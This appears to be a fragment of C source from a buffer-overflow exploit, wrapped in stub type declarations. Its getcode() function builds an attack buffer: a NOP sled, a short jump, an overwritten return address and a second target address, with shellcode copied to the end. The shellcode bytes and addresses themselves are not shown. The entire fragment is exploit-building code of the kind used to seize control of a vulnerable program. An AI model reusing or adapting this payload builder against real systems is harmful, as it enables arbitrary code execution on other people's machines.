
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int BUFSIZE ;
 int PLACEMENT_OFFSET ;
 long REPLACE_VI_ADDR ;
 long RET_ADDR ;
 scalar_t__ malloc (int) ;
 int memcpy (unsigned char*,int ,int) ;
 int memset (unsigned char*,int,int) ;
 int printe (char*,int) ;
 int strlen (int ) ;
 int x86_exec ;

unsigned char *getcode(void){
unsigned char *buf;
if(!(buf=(unsigned char *)malloc(BUFSIZE+1)))
printe("getcode(): allocating memory failed.",1);


memset(buf,0x90,BUFSIZE);



buf[254+(PLACEMENT_OFFSET*4)]=0xeb;
buf[255+(PLACEMENT_OFFSET*4)]=0x08;


*(long *)&buf[256+(PLACEMENT_OFFSET*4)]=RET_ADDR;




*(long *)&buf[260+(PLACEMENT_OFFSET*4)]=REPLACE_VI_ADDR;


memcpy(buf+BUFSIZE-strlen(x86_exec),x86_exec,strlen(x86_exec));
return(buf);
}
